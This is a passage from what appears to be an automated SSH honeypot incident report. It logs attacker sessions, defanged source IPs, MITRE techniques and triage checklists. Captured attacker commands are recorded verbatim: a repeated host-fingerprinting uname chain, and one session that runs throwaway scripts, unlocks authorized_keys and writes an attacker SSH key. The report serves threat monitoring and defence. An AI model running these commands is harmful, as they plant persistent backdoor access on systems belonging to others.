| `2026-08-11 05:02:43` | `cowrie.client.kex` |
| `2026-08-11 05:02:44` | `cowrie.login.success` |
| `2026-08-11 05:02:44` | `cowrie.direct-tcpip.request` |
| `2026-08-11 05:02:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.194[.]135` to AbuseIPDB if not already reported
- [ ] Block `178.178.194[.]135` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b6aaeb9e80f5

| Field | Detail |
|---|---|
| **Source IP** | `179.181.133[.]153` |
| **First Seen** | 2026-08-11 05:11 |
| **Last Seen** | 2026-08-11 05:11 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 05:11:01` | `cowrie.session.connect` |
| `2026-08-11 05:11:01` | `cowrie.client.version` |
| `2026-08-11 05:11:01` | `cowrie.client.kex` |
| `2026-08-11 05:11:02` | `cowrie.login.success` |
| `2026-08-11 05:11:03` | `cowrie.direct-tcpip.request` |
| `2026-08-11 05:11:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.181.133[.]153` to AbuseIPDB if not already reported
- [ ] Block `179.181.133[.]153` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48c036acc19b

| Field | Detail |
|---|---|
| **Source IP** | `121.228.250[.]70` |
| **First Seen** | 2026-08-11 05:18 |
| **Last Seen** | 2026-08-11 05:18 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 05:18:36` | `cowrie.session.connect` |
| `2026-08-11 05:18:36` | `cowrie.client.version` |
| `2026-08-11 05:18:36` | `cowrie.client.kex` |
| `2026-08-11 05:18:39` | `cowrie.login.success` |
| `2026-08-11 05:18:41` | `cowrie.session.params` |
| `2026-08-11 05:18:41` | `cowrie.command.input` |
| `2026-08-11 05:18:42` | `cowrie.log.closed` |
| `2026-08-11 05:18:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.228.250[.]70` to AbuseIPDB if not already reported
- [ ] Block `121.228.250[.]70` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-84f15c123b81

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-11 05:18 |
| **Last Seen** | 2026-08-11 05:18 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 05:18:51` | `cowrie.session.connect` |
| `2026-08-11 05:18:51` | `cowrie.client.version` |
| `2026-08-11 05:18:51` | `cowrie.client.kex` |
| `2026-08-11 05:18:52` | `cowrie.login.success` |
| `2026-08-11 05:18:54` | `cowrie.session.params` |
| `2026-08-11 05:18:54` | `cowrie.command.input` |
| `2026-08-11 05:18:54` | `cowrie.command.input` |
| `2026-08-11 05:18:54` | `cowrie.command.input` |
| `2026-08-11 05:18:54` | `cowrie.command.input` |
| `2026-08-11 05:18:54` | `cowrie.command.input` |
| `2026-08-11 05:18:54` | `cowrie.command.success` |
| `2026-08-11 05:18:54` | `cowrie.command.input` |
| `2026-08-11 05:18:54` | `cowrie.command.input` |
| `2026-08-11 05:18:54` | `cowrie.command.input` |
| `2026-08-11 05:18:54` | `cowrie.command.input` |
| `2026-08-11 05:18:54` | `cowrie.log.closed` |
| `2026-08-11 05:18:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c6bf8cb0fa63

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-11 05:20 |
| **Last Seen** | 2026-08-11 05:20 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 05:20:30` | `cowrie.session.connect` |
| `2026-08-11 05:20:30` | `cowrie.client.version` |
| `2026-08-11 05:20:30` | `cowrie.client.kex` |
| `2026-08-11 05:20:31` | `cowrie.login.success` |
| `2026-08-11 05:20:33` | `cowrie.session.params` |
| `2026-08-11 05:20:33` | `cowrie.command.input` |
| `2026-08-11 05:20:33` | `cowrie.command.input` |
| `2026-08-11 05:20:33` | `cowrie.command.input` |
| `2026-08-11 05:20:33` | `cowrie.command.input` |
| `2026-08-11 05:20:33` | `cowrie.command.input` |
| `2026-08-11 05:20:33` | `cowrie.command.success` |
| `2026-08-11 05:20:33` | `cowrie.command.input` |
| `2026-08-11 05:20:33` | `cowrie.command.input` |
| `2026-08-11 05:20:33` | `cowrie.command.input` |
| `2026-08-11 05:20:33` | `cowrie.command.input` |
| `2026-08-11 05:20:34` | `cowrie.log.closed` |
| `2026-08-11 05:20:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8c5798fcde3

| Field | Detail |
|---|---|
| **Source IP** | `47.85.164[.]184` |
| **First Seen** | 2026-08-11 05:20 |
| **Last Seen** | 2026-08-11 05:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 05:20:53` | `cowrie.session.connect` |
| `2026-08-11 05:20:53` | `cowrie.client.version` |
| `2026-08-11 05:20:53` | `cowrie.client.kex` |
| `2026-08-11 05:20:53` | `cowrie.login.success` |
| `2026-08-11 05:20:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.85.164[.]184` to AbuseIPDB if not already reported
- [ ] Block `47.85.164[.]184` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b8a78a3a708

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-08-11 05:20 |
| **Last Seen** | 2026-08-11 05:20 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `chmod +x clean.sh; sh clean.sh; rm -rf clean.sh; chmod +x setup.sh; sh setup.sh; rm -rf setup.sh; mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCqHrvnL6l7rT/mt1AdgdY9tC1GPK216q0q/7neNVqm7AgvfJIM3ZKniGC3S5x6KOEApk+83GM4IKjCPfq007SvT07qh9AscVxegv66I5yuZTEaDAG6cPXxg3/0oXHTOTvxelgbRrMzfU5SEDAEi8+ByKMefE+pDVALgSTBYhol96hu1GthAMtPAFahqxrvaRR4nL4ijxOsmSLREoAb1lxiX7yvoYLT45/1c5dJdrJrQ60uKyieQ6FieWpO2xF6tzfdmHbiVdSmdw0BiCRwe+fuknZYQxIC1owAj2p5bc+nzVTi3mtBEk9rGpgBnJ1h` |
| **TTPs (MITRE)** | T1021.004 · T1059.004 · T1078 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 05:20:53` | `cowrie.session.connect` |
| `2026-08-11 05:20:53` | `cowrie.client.version` |
| `2026-08-11 05:20:54` | `cowrie.client.kex` |
| `2026-08-11 05:20:54` | `cowrie.login.success` |
| `2026-08-11 05:20:56` | `cowrie.session.params` |
| `2026-08-11 05:20:56` | `cowrie.command.input` |
| `2026-08-11 05:20:56` | `cowrie.log.closed` |
| `2026-08-11 05:20:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b20976c7ddb8

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-11 05:22 |
| **Last Seen** | 2026-08-11 05:22 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 05:22:13` | `cowrie.session.connect` |
| `2026-08-11 05:22:13` | `cowrie.client.version` |
| `2026-08-11 05:22:13` | `cowrie.client.kex` |
| `2026-08-11 05:22:14` | `cowrie.login.success` |
| `2026-08-11 05:22:16` | `cowrie.session.params` |
| `2026-08-11 05:22:16` | `cowrie.command.input` |
| `2026-08-11 05:22:16` | `cowrie.command.input` |
| `2026-08-11 05:22:16` | `cowrie.command.input` |
| `2026-08-11 05:22:16` | `cowrie.command.input` |
| `2026-08-11 05:22:16` | `cowrie.command.input` |
| `2026-08-11 05:22:16` | `cowrie.command.success` |
| `2026-08-11 05:22:16` | `cowrie.command.input` |
| `2026-08-11 05:22:16` | `cowrie.command.input` |
| `2026-08-11 05:22:16` | `cowrie.command.input` |
| `2026-08-11 05:22:16` | `cowrie.command.input` |
| `2026-08-11 05:22:16` | `cowrie.log.closed` |
| `2026-08-11 05:22:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-031f309434b7

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-11 05:24 |
| **Last Seen** | 2026-08-11 05:24 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 05:24:00` | `cowrie.session.connect` |
| `2026-08-11 05:24:00` | `cowrie.client.version` |
| `2026-08-11 05:24:00` | `cowrie.client.kex` |
| `2026-08-11 05:24:02` | `cowrie.login.success` |
| `2026-08-11 05:24:03` | `cowrie.session.params` |
| `2026-08-11 05:24:03` | `cowrie.command.input` |
| `2026-08-11 05:24:03` | `cowrie.command.input` |
| `2026-08-11 05:24:03` | `cowrie.command.input` |
| `2026-08-11 05:24:03` | `cowrie.command.input` |
| `2026-08-11 05:24:03` | `cowrie.command.input` |
| `2026-08-11 05:24:03` | `cowrie.command.success` |
| `2026-08-11 05:24:03` | `cowrie.command.input` |
| `2026-08-11 05:24:03` | `cowrie.command.input` |
| `2026-08-11 05:24:03` | `cowrie.command.input` |
| `2026-08-11 05:24:03` | `cowrie.command.input` |
| `2026-08-11 05:24:03` | `cowrie.log.closed` |
| `2026-08-11 05:24:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0deb6770c66b

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-11 05:25 |
| **Last Seen** | 2026-08-11 05:25 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 05:25:47` | `cowrie.session.connect` |
| `2026-08-11 05:25:47` | `cowrie.client.version` |
| `2026-08-11 05:25:47` | `cowrie.client.kex` |
| `2026-08-11 05:25:48` | `cowrie.login.success` |
| `2026-08-11 05:25:49` | `cowrie.session.params` |
| `2026-08-11 05:25:49` | `cowrie.command.input` |
| `2026-08-11 05:25:49` | `cowrie.command.input` |
| `2026-08-11 05:25:49` | `cowrie.command.input` |
| `2026-08-11 05:25:49` | `cowrie.command.input` |
| `2026-08-11 05:25:49` | `cowrie.command.input` |
| `2026-08-11 05:25:49` | `cowrie.command.success` |
| `2026-08-11 05:25:49` | `cowrie.command.input` |
| `2026-08-11 05:25:49` | `cowrie.command.input` |
| `2026-08-11 05:25:49` | `cowrie.command.input` |
| `2026-08-11 05:25:49` | `cowrie.command.input` |
| `2026-08-11 05:25:49` | `cowrie.log.closed` |
| `2026-08-11 05:25:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e3b319972ba3

| Field | Detail |
|---|---|
| **Source IP** | `200.105.141[.]172` |
| **First Seen** | 2026-08-11 05:27 |
| **Last Seen** | 2026-08-11 05:27 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 05:27:27` | `cowrie.session.connect` |
| `2026-08-11 05:27:27` | `cowrie.client.version` |
| `2026-08-11 05:27:27` | `cowrie.client.kex` |
| `2026-08-11 05:27:29` | `cowrie.login.success` |
| `2026-08-11 05:27:30` | `cowrie.direct-tcpip.request` |
| `2026-08-11 05:27:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.105.141[.]172` to AbuseIPDB if not already reported
- [ ] Block `200.105.141[.]172` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a83800254332

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-11 05:27 |
| **Last Seen** | 2026-08-11 05:27 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 05:27:28` | `cowrie.session.connect` |
| `2026-08-11 05:27:28` | `cowrie.client.version` |
| `2026-08-11 05:27:28` | `cowrie.client.kex` |
| `2026-08-11 05:27:29` | `cowrie.login.success` |
| `2026-08-11 05:27:30` | `cowrie.session.params` |
| `2026-08-11 05:27:30` | `cowrie.command.input` |
| `2026-08-11 05:27:30` | `cowrie.command.input` |
| `2026-08-11 05:27:30` | `cowrie.command.input` |
| `2026-08-11 05:27:30` | `cowrie.command.input` |
| `2026-08-11 05:27:30` | `cowrie.command.input` |
| `2026-08-11 05:27:30` | `cowrie.command.success` |
| `2026-08-11 05:27:30` | `cowrie.command.input` |
| `2026-08-11 05:27:30` | `cowrie.command.input` |
| `2026-08-11 05:27:30` | `cowrie.command.input` |
| `2026-08-11 05:27:30` | `cowrie.command.input` |
| `2026-08-11 05:27:30` | `cowrie.log.closed` |
| `2026-08-11 05:27:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-229ed5d8b43f

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-11 05:30 |
| **Last Seen** | 2026-08-11 05:31 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 05:30:59` | `cowrie.session.connect` |
| `2026-08-11 05:30:59` | `cowrie.client.version` |
| `2026-08-11 05:30:59` | `cowrie.client.kex` |
| `2026-08-11 05:31:00` | `cowrie.login.success` |
| `2026-08-11 05:31:01` | `cowrie.session.params` |
| `2026-08-11 05:31:01` | `cowrie.command.input` |
| `2026-08-11 05:31:01` | `cowrie.command.input` |
| `2026-08-11 05:31:01` | `cowrie.command.input` |
| `2026-08-11 05:31:01` | `cowrie.command.input` |
| `2026-08-11 05:31:01` | `cowrie.command.input` |
| `2026-08-11 05:31:01` | `cowrie.command.success` |
| `2026-08-11 05:31:01` | `cowrie.command.input` |
| `2026-08-11 05:31:01` | `cowrie.command.input` |
| `2026-08-11 05:31:01` | `cowrie.command.input` |
| `2026-08-11 05:31:01` | `cowrie.command.input` |
| `2026-08-11 05:31:01` | `cowrie.log.closed` |
| `2026-08-11 05:31:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-00c946cb9400

| Field | Detail |
|---|---|
| **Source IP** | `117.247.239[.]202` |
| **First Seen** | 2026-08-11 05:31 |
| **Last Seen** | 2026-08-11 05:31 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 05:31:49` | `cowrie.session.connect` |
| `2026-08-11 05:31:50` | `cowrie.client.version` |
| `2026-08-11 05:31:50` | `cowrie.client.kex` |
| `2026-08-11 05:31:52` | `cowrie.login.success` |
| `2026-08-11 05:31:53` | `cowrie.direct-tcpip.request` |
| `2026-08-11 05:31:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.247.239[.]202` to AbuseIPDB if not already reported
- [ ] Block `117.247.239[.]202` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2097aac19cec

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-11 05:32 |
| **Last Seen** | 2026-08-11 05:32 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 05:32:51` | `cowrie.session.connect` |
| `2026-08-11 05:32:51` | `cowrie.client.version` |
| `2026-08-11 05:32:51` | `cowrie.client.kex` |
| `2026-08-11 05:32:52` | `cowrie.login.success` |
| `2026-08-11 05:32:53` | `cowrie.session.params` |
| `2026-08-11 05:32:53` | `cowrie.command.input` |
| `2026-08-11 05:32:53` | `cowrie.command.input` |
| `2026-08-11 05:32:53` | `cowrie.command.input` |
| `2026-08-11 05:32:53` | `cowrie.command.input` |
| `2026-08-11 05:32:53` | `cowrie.command.input` |
| `2026-08-11 05:32:53` | `cowrie.command.success` |
| `2026-08-11 05:32:53` | `cowrie.command.input` |
| `2026-08-11 05:32:53` | `cowrie.command.input` |
| `2026-08-11 05:32:53` | `cowrie.command.input` |
| `2026-08-11 05:32:53` | `cowrie.command.input` |
| `2026-08-11 05:32:54` | `cowrie.log.closed` |
| `2026-08-11 05:32:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a8fa43f1131

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-11 05:34 |
| **Last Seen** | 2026-08-11 05:34 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 05:34:42` | `cowrie.session.connect` |
| `2026-08-11 05:34:42` | `cowrie.client.version` |
| `2026-08-11 05:34:42` | `cowrie.client.kex` |
| `2026-08-11 05:34:43` | `cowrie.login.success` |
| `2026-08-11 05:34:44` | `cowrie.session.params` |
| `2026-08-11 05:34:44` | `cowrie.command.input` |
| `2026-08-11 05:34:44` | `cowrie.command.input` |
| `2026-08-11 05:34:44` | `cowrie.command.input` |
| `2026-08-11 05:34:44` | `cowrie.command.input` |
| `2026-08-11 05:34:44` | `cowrie.command.input` |
| `2026-08-11 05:34:44` | `cowrie.command.success` |
| `2026-08-11 05:34:44` | `cowrie.command.input` |
